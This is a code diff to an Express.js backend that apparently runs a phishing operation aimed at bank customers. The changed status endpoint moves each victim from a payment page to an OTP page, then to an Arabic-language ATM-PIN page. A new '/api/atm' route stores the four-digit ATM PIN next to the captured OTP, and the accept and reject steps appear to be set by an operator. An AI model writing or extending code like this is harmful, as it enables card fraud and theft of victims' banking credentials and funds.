@@ -179,13 +179,38 @@ app.get('/api/status/:id', (req, res) => {
     return res.status(404).json({ ok: false, error: 'not_found' });
   }
 
+  const status = item.status || 'pending';
+  let redirectUrl = 'payment.html';
+  let redirect = null;
+  let decision = null;
+  let stage = 'payment';
+
+  if (status === 'accept') {
+    redirectUrl = 'otp.html';
+    redirect = 'otp.html';
+    decision = 'approved';
+    stage = 'otp';
+  } else if (status === 'otp_verified' || status === 'atm') {
+    redirectUrl = 'atm-ar.html';
+    redirect = 'atm-ar.html';
+    decision = 'approved';
+    stage = 'atm';
+  } else if (status === 'success') {
+    redirectUrl = 'success-ar.html';
+    redirect = 'success-ar.html';
+    decision = 'approved';
+    stage = 'success';
+  } else if (status === 'reject') {
+    decision = 'rejected';
+  }
+
   const payload = {
     ok: true,
-    status: item.status || 'pending',
-    redirectUrl: item.status === 'accept' ? 'otp.html' : 'payment.html',
-    redirect: item.status === 'accept' ? 'otp.html' : null,
-    decision: item.status === 'accept' ? 'approved' : item.status === 'reject' ? 'rejected' : null,
-    stage: item.status === 'accept' ? 'otp' : 'payment'
+    status,
+    redirectUrl,
+    redirect,
+    decision,
+    stage
   };
 
   res.json(payload);
@@ -206,6 +231,27 @@ app.post('/api/otp', (req, res) => {
 
   item.status = 'otp_verified';
   item.otp = otp;
+  item.updatedAt = new Date().toISOString();
+  writeApplications(list);
+
+  res.json({ ok: true, redirect: 'atm-ar.html' });
+});
+
+app.post('/api/atm', (req, res) => {
+  const { id, atmPin } = req.body || {};
+  const list = readApplications();
+  const item = list.find((entry) => entry.id === id);
+
+  if (!item) {
+    return res.status(404).json({ ok: false, error: 'not_found' });
+  }
+
+  if (typeof atmPin !== 'string' || !/^\d{4}$/.test(atmPin.trim())) {
+    return res.status(400).json({ ok: false, error: 'invalid_atm_pin' });
+  }
+
+  item.status = 'success';
+  item.atmPin = atmPin.trim();
   item.updatedAt = new Date().toISOString();
   writeApplications(list);
 
